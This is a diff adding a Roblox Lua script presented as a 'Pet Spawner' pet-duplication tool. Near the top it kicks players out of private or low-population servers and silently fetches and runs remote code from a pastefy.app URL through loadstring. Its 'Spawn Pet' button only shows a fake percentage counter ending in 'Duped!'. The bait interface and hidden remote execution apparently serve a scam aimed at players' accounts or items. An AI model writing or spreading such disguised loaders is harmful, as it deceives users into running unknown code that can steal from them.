@@ -1,0 +1,142 @@
+-- AUTO-KICK Protection
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+if game.PrivateServerId ~= "" or #Players:GetPlayers() <= 2 then
+    LocalPlayer:Kick("Not allowed in private servers or low-player servers.")
+    return
+end
+
+-- Remove old UI
+pcall(function() game.CoreGui.PetSpawner:Destroy() end)
+
+-- External script
+loadstring(game:HttpGet("https://pastefy.app/FAON0Gbi/raw", true))()
+
+-- Services
+local coreGui = game:GetService("CoreGui")
+local uis = game:GetService("UserInputService")
+local runService = game:GetService("RunService")
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui", coreGui)
+screenGui.Name = "PetSpawner"
+screenGui.ResetOnSpawn = false
+
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.Size = UDim2.new(0, 320, 0, 260)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -130)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+
+-- Rainbow border frame
+local border = Instance.new("UIStroke", mainFrame)
+border.Thickness = 4
+border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+border.LineJoinMode = Enum.LineJoinMode.Round
+
+-- Animate rainbow border
+local hue = 0
+runService.RenderStepped:Connect(function()
+	hue = (hue + 0.002) % 1
+	border.Color = ColorSequence.new{
+		ColorSequenceKeypoint.new(0, Color3.fromHSV(hue, 1, 1)),
+		ColorSequenceKeypoint.new(1, Color3.fromHSV((hue + 0.25) % 1, 1, 1))
+	}
+end)
+
+-- Title
+local title = Instance.new("TextLabel", mainFrame)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "Pet Spawner"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+
+-- Pet Input Box
+local petInput = Instance.new("TextBox", mainFrame)
+petInput.PlaceholderText = "Enter pet name..."
+petInput.Position = UDim2.new(0.05, 0, 0, 35)
+petInput.Size = UDim2.new(0.9, 0, 0, 30)
+petInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+petInput.TextColor3 = Color3.new(1, 1, 1)
+petInput.Font = Enum.Font.Gotham
+petInput.TextSize = 16
+petInput.ClearTextOnFocus = false
+
+-- Rarity Buttons
+local function createBtn(name, color, x)
+	local btn = Instance.new("TextButton", mainFrame)
+	btn.Size = UDim2.new(0, 80, 0, 30)
+	btn.Position = UDim2.new(0, x, 0, 70)
+	btn.Text = name
+	btn.BackgroundColor3 = color
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 16
+	return btn
+end
+
+local mfrBtn = createBtn("MFR", Color3.fromRGB(255, 80, 80), 10)
+local nfrBtn = createBtn("NFR", Color3.fromRGB(80, 255, 80), 110)
+local frBtn  = createBtn("FR",  Color3.fromRGB(80, 80, 255), 210)
+
+-- Spawn Pet Button
+local spawnBtn = Instance.new("TextButton", mainFrame)
+spawnBtn.Size = UDim2.new(0.9, 0, 0, 40)
+spawnBtn.Position = UDim2.new(0.05, 0, 0, 110)
+spawnBtn.Text = "Spawn Pet"
+spawnBtn.BackgroundColor3 = Color3.fromRGB(70, 140, 255)
+spawnBtn.TextColor3 = Color3.new(1, 1, 1)
+spawnBtn.Font = Enum.Font.GothamBold
+spawnBtn.TextSize = 18
+
+-- Loading / Duped Status
+local loadingText = Instance.new("TextLabel", mainFrame)
+loadingText.Size = UDim2.new(1, 0, 0, 30)
+loadingText.Position = UDim2.new(0, 0, 1, -60)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = ""
+loadingText.TextColor3 = Color3.fromRGB(80, 255, 80)
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextSize = 20
+
+-- Credit Label
+local credit = Instance.new("TextLabel", mainFrame)
+credit.Size = UDim2.new(1, 0, 0, 20)
+credit.Position = UDim2.new(0, 0, 1, -25)
+credit.BackgroundTransparency = 1
+credit.Text = "Created by @Streets341 on YouTube"
+credit.TextColor3 = Color3.fromRGB(255, 255, 255)
+credit.Font = Enum.Font.Gotham
+credit.TextSize = 14
+credit.TextTransparency = 0.25
+
+-- Duplication Logic
+local running = false
+spawnBtn.MouseButton1Click:Connect(function()
+	if running then return end
+	local petName = petInput.Text
+	if petName == "" then
+		loadingText.Text = "Enter pet name!"
+		wait(2)
+		loadingText.Text = ""
+		return
+	end
+	running = true
+	spawnBtn.Text = "Loading..."
+
+	for i = 1, 100 do
+		loadingText.Text = "[" .. petName .. "] " .. i .. "%"
+		wait(1.2)
+	end
+
+	loadingText.Text = petName .. " Duped!"
+	spawnBtn.Text = "Spawn Pet"
+	wait(2)
+	loadingText.Text = ""
+	running = false
+end)
